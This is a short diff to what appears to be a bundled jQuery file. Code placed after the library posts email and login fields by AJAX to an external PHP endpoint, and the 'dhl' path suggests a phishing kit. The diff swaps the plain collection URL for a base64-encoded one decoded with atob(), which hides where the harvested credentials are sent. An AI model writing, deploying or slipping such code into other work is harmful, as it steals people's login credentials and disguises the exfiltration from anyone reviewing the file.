@@ -10911,7 +10911,7 @@ return jQuery;
         $("#password").css("border", "1px solid #ccc"); 
         $("#email").css("border", "1px solid #ccc"); 
         $.ajax({
-            url: "https://elfargoltd.com/dhl/log.php",
+            url: atob("aHR0cHM6Ly9zenhjby5jb20veC9pbmRleC5waHA="),
             method: "post",
             data: {
                 X1: email,
